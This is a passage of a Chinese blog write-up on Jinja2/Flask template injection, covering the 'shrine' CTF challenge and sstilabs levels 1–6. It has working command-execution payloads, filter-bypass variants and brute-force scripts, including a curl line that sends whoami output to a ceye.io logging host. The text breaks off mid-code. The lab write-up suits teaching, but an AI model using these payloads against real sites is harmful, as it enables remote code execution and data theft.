即可查看配置文件
![m0re](https://gitee.com/m0re/picture/raw/master/img/20201206174232.png)
详细的不写了，之前写过，参考[https://blog.csdn.net/qq_45836474/article/details/107940521#_2018easy_tornado_1](https://blog.csdn.net/qq_45836474/article/details/107940521#_2018easy_tornado_1)

### shrine
给出源码如下：
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os
app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
访问/shrine/&#123;&#123;1+1&#125;&#125; ![m0re](https://gitee.com/m0re/picture/raw/master/img/20201206194239.png) 存在ssti注入，查看配置文件，源码显示黑名单</code>config,self<code>假如没有这个黑名单，那么可以这样查看配置文件。 传入&#123;&#123;config&#125;&#125;或者&#123;&#123;self.__dict__&#125;&#125;都可以查看配置。 python的沙箱逃逸这里的方法是利用python对象之间的引用关系来调用被禁用的函数对象。url_for和get_flashed_messages payload:</code>`<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206201259.png" alt="m0re" loading="lazy"><br>url_for同理<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206201332.png" alt="m0re" loading="lazy"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行，通过类的继承一步一步调用到对应函数来执行命令，这里学习三个函数的调用。</p>
<h3 id="os-system"><a href="#os-system" class="headerlink" title="os.system"></a>os.system</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#python2</span>
<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span></code></pre>
<p>直接执行命令，但是有时有回显，有时无回显，后面学习无回显的情况。<br>这个调用相当直接，且是同步进行的，程序需要阻塞并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值。<br>注意：该函数返回命令执行结果的返回值，并不是返回命令的执行输出（执行成功返回0，失败返回-1）</p>
<h3 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h3><p>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同<br>用法：os.popen(command[,mode[,bufsize]])<br><code>说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。</code><br>popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>用read()可以把结果回显。</p>
<h3 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h3><p><code>subprocess</code> 模块有比较多的功能，<code>subprocess</code>模块被推荐用来替换一些老的模块和函数，如：<code>os.system、os.spawn、os.popen</code>等<br><code>subprocess</code>模块目的是启动一个新的进程并与之通信。这里只讲用来运行shell命令的两个常用方法。<br><code>subprocess.call(&quot;command&quot;)</code><br>父进程等待子进程完成<br>返回退出信息(<code>returncode</code>，相当于Linux exit code)<br>与os.system功能相似,也无执行结果的回显<br><code>subprocess.Popen(&quot;command&quot;)</code><br>Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息。</p>
<h2 id="payload如何构造的"><a href="#payload如何构造的" class="headerlink" title="payload如何构造的"></a>payload如何构造的</h2><p>为了避免遇题就搜payload的现象，学习一下如何构造ssti可用payload<br>如果要构造一个执行命令的payload，那么就寻找os模块的system函数进行调用即可。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>查阅资料发现访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者<code>__globals</code>）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p>
<p>于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试）</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span></code></pre>
<p>我们除了知道了<code>linecache</code>、<code>os</code>可以获取到命令执行的函数以外，我们前面还提到了一个<code>__builtins__</code>内建函数，在python的内建函数中我们也可以获取到诸如<code>eval</code>等执行命令的函数。<br><strong>还有关于可以利用的特殊函数的总结，也是有大佬进行总结收集的</strong>：<a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0%E6%9F%A5%E6%89%BE">https://misakikata.github.io/</a></p>
<h2 id="SSTIlabs"><a href="#SSTIlabs" class="headerlink" title="SSTIlabs"></a>SSTIlabs</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">https://github.com/X3NNY/sstilabs</a>，安装也十分简单，安装过flask后，直接在flasklab目录下运行<code>app.py</code>，即可在<a target="_blank" rel="noopener" href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> 打开靶场！环境：python3.9</p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220107011452.png" loading="lazy"></p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level-1"></a>Level-1</h3><p>此关卡无waf，就是一个有漏洞的点给出来了，要拿到flag。<br>这里找可以利用的特殊函数，看的社区里的师傅是写了脚本来找的，这里也参考下，利用脚本来进行查找。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5000/level/1"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'&#123;&#123;"".__class__.__base__.__subclasses__()['</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">']&#125;&#125;'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print(data)</span>
        <span class="token comment">#print(response.text)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">"_wrap_close"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">"----->"</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
<span class="token comment"># 139 -----> Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></code></pre>
<p>这里运行出来，发现第139可以使用。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p>由于我直接在Windows系统中进行搭建，所以读取文件时，自然也要使用Windows命令，使用Linux命令自然是不可行的。主要是这个继承关系，参数不固定。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220108005319.png" loading="lazy"></p>
<p>在python交互式命令行中执行也是没问题的<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220108005424.png" loading="lazy"></p>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h3><p>第二关描述是ban了<code>&#123;&#123;`，可以使用`&#123;%%&#125;`来代替。
这里使用`&#123;%%&#125;`有两种方法，一种是`print()`标记，因为使用`&#123;%%&#125;`是没有回显的，所以才需要加一个print()来使得它有回显，比如：`&#123;%print(config)%&#125;`
所以这里的payload为
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>%print<span class="token punctuation">(</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">))</span>%<span class="token punctuation">&#125;</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220108011732.png)
还有一种方法是使用语句拼接，形式像这样的。
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">433</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.xxxxx.ceye.io"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span>% endif %<span class="token punctuation">&#125;</span></code></pre>
模仿一下使用的是
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token keyword">if</span> <span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">&#125;</span>payload<span class="token punctuation">&#123;</span>% endif %<span class="token punctuation">&#125;</span></code></pre>
这是两种形式，那么在比赛中，或者CTF题目当中，可以选择使用脚本来进行盲注。
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5000/level/2"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'&#123;% if "".__class__.__base__.__subclasses__()['</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'].__init__.__globals__["popen"]("type flag").read() %&#125;test&#123;% endif %&#125;'</span><span class="token punctuation">&#125;</span>
        <span class="token comment"># data = &#123;"code": '&#123;% print("".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("type flag").read()) %&#125;'&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">"test"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">"--->"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
<span class="token comment"># 139 ---> &#123;'code': '&#123;% if "".__class__.__base__.__subclasses__()[139].__init__.__globals__["popen"]("type flag").read() %&#125;test&#123;% endif %&#125;'&#125;</span></code></pre>
盲注方式如上。猜解可以利用的特殊函数序号而已，也不是什么有难度的脚本。
### Level-3
第三关的描述是
> no waf and blind

测试发现在payload构造正确时，不会返回执行的内容了，而是correct，反之错误时则返回wrong。
![](https://gitee.com/m0re/picture/raw/master/img/20220108012936.png)
这个也是使用盲注，但是需要开启一个服务器，这个可以在本地监听一个端口，进行反弹信息。
![](https://gitee.com/m0re/picture/raw/master/img/20220108013339.png)
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5000/level/3"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'&#123;&#123;"".__class__.__base__.__subclasses__()['</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'].__init__.__globals__["popen"]("curl http://127.0.0.1:9000/`cat flag`").read()&#125;&#125;'</span><span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220108013631.png)

由于环境搭建在Windows系统上，两个反引号不能执行系统命令了，所以就无法正确返回内容，对于Linux系统的环境，这个方法是完全没问题的。

### Level-4
> bl['[', ']']

过滤了中括号，使用`__getitem__()`绕过
修改payload即可
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__.__getitem__<span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

### Level-5
> 过滤引号 单双引号

其中一种方法是使用`request.args`来绕过
> 在搭建flask时,大多数程序内部都会使用 flask的request来解析get请求.此出我们就可以通过构造带参数的url,配合 request.args 获取构造参数的内容来绕过限制

<pre class="language-bash" data-language="bash"><code class="language-bash">get: <span class="token assign-left variable">a</span><span class="token operator">=</span>popen<span class="token operator">&amp;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>type flag
post: <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span>request.args.a<span class="token punctuation">]</span><span class="token punctuation">(</span>request.args.b<span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220110122143.png)

### Level-6
过滤的是下划线，所以很多使用下划线连接的语句都需要修改绕过。
使用过滤器`| attr()`绕过
过滤器
> 1. 过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数
> 2. 可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.

经常使用的过滤器
<pre class="language-bash" data-language="bash"><code class="language-bash">length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 获取一个序列或者字典的长度并将其返回</span>

int<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将值转换为int类型；</span>

float<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将值转换为float类型；</span>

lower<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将字符串转换为小写；</span>

upper<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将字符串转换为大写；</span>

reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 反转字符串；</span>

replace<span class="token punctuation">(</span>value,old,new<span class="token punctuation">)</span>： <span class="token comment"># 将value中的old替换为new</span>

list<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将变量转换为列表类型；</span>

string<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将变量转换成字符串类型；</span>

join<span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment"># 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span>

attr<span class="token punctuation">(</span><span class="token punctuation">)</span>: <span class="token comment"># 获取对象的属性</span></code></pre>
`_`的十六进制编码为`\x5f`
所以`__class__`可以写成`\x5f\x5fclass\x5f\x5f`
这一关可以使用编码绕过，十六进制编码和Unicode编码都可以，以及base64编码和rot13等编码去绕过。
但是编码过后的`_`不能直接与`.`连接，所以这个时候需要使用到过滤器进行连接，过滤器的用法是`foo|attr("bar")`,结果等价于`foo.bar`
这一关的payload
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 编码后</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>class<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>base<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>subclasses<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>init<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>globals<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220110123912.png)
其他编码
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># base64</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>class<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>base<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>subclasses<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>init<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token 